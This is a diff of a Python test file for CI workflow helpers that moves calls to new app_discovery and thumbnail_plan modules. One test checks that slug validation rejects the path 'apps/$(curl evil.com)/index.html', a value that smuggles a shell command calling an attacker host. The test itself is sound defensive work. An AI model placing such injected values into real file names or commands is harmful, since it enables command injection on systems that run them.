@@ -5,7 +5,9 @@ from pathlib import Path
 
 import pytest
 
+import scripts.build.thumbnail_plan as thumbnail_plan
 import scripts.ci.workflow_helpers as workflow_helpers
+import scripts.lib.app_discovery as app_discovery
 from tests.ci.workflow_helpers_test_support import FakeSubprocessResult, write_text
 
 
@@ -442,11 +444,11 @@ def test_validate_thumbnail_artifact_rejects_unexpected_files(tmp_path: Path) ->
 
 
 def test_discover_app_slugs_returns_empty_when_apps_dir_missing(tmp_path: Path) -> None:
-    assert workflow_helpers.discover_app_slugs(tmp_path / "missing") == []
+    assert app_discovery.discover_app_slugs(tmp_path / "missing") == []
 
 
 def test_runtime_change_plan_skips_app_docs_and_metadata_only_changes() -> None:
-    plan = workflow_helpers.runtime_change_plan(
+    plan = app_discovery.runtime_change_plan(
         [
             "apps/loan-amortization/docs/verification.md",
             "apps/loan-amortization/name.txt",
@@ -463,7 +465,7 @@ def test_runtime_change_plan_skips_app_docs_and_metadata_only_changes() -> None:
 
 
 def test_runtime_change_plan_rejects_non_kebab_slugs() -> None:
-    plan = workflow_helpers.runtime_change_plan(
+    plan = app_discovery.runtime_change_plan(
         [
             "apps/$(curl evil.com)/index.html",
             "apps/UPPER_CASE/js/app.js",
@@ -480,7 +482,7 @@ def test_runtime_change_plan_rejects_non_kebab_slugs() -> None:
 
 
 def test_runtime_change_plan_treats_app_theme_bootstrap_as_shared_runtime() -> None:
-    plan = workflow_helpers.runtime_change_plan(["js/app-theme.js"])
+    plan = app_discovery.runtime_change_plan(["js/app-theme.js"])
 
     assert plan == {
         "app_scope": "all",
@@ -491,13 +493,13 @@ def test_runtime_change_plan_treats_app_theme_bootstrap_as_shared_runtime() -> N
 
 
 def test_pr_field_and_generated_thumbnail_pr_helpers() -> None:
-    assert workflow_helpers._pr_field("not-a-dict", "title") == ""
-    assert workflow_helpers._pr_field({"title": 5}, "title") == ""
-    assert workflow_helpers.is_generated_thumbnail_pr("bad") is False
-    assert workflow_helpers.is_generated_thumbnail_pr(
+    assert thumbnail_plan.pr_field("not-a-dict", "title") == ""
+    assert thumbnail_plan.pr_field({"title": 5}, "title") == ""
+    assert thumbnail_plan.is_generated_thumbnail_pr("bad") is False
+    assert thumbnail_plan.is_generated_thumbnail_pr(
         {
             "title": "Something else",
-            "body": workflow_helpers.THUMBNAIL_FOLLOWUP_PR_MARKER,
+            "body": thumbnail_plan.THUMBNAIL_FOLLOWUP_PR_MARKER,
             "head": {"ref": "feature/demo"},
         }
     )
@@ -530,8 +532,8 @@ def test_associated_pr_kind_for_commit_detects_thumbnail_followup_and_none(
         "_run_gh_api_json",
         lambda *args, **kwargs: [
             {
-                "title": workflow_helpers.THUMBNAIL_FOLLOWUP_PR_TITLE,
-                "body": workflow_helpers.THUMBNAIL_FOLLOWUP_PR_MARKER,
+                "title": thumbnail_plan.THUMBNAIL_FOLLOWUP_PR_TITLE,
+                "body": thumbnail_plan.THUMBNAIL_FOLLOWUP_PR_MARKER,
                 "head": {"ref": "ci/save-generated-thumbnails-20260326"},
             }
         ],
@@ -623,7 +625,7 @@ def test_validate_thumbnail_artifact_rejects_missing_root_and_plan(
     with pytest.raises(ValueError, match="missing plan.json"):
         workflow_helpers.validate_thumbnail_artifact(artifact_root)
     with pytest.raises(FileNotFoundError):
-        workflow_helpers.read_thumbnail_plan(artifact_root)
+        thumbnail_plan.read_thumbnail_plan(artifact_root)
 
 
 @pytest.mark.skipif(not hasattr(Path, "symlink_to"), reason="symlinks unavailable")
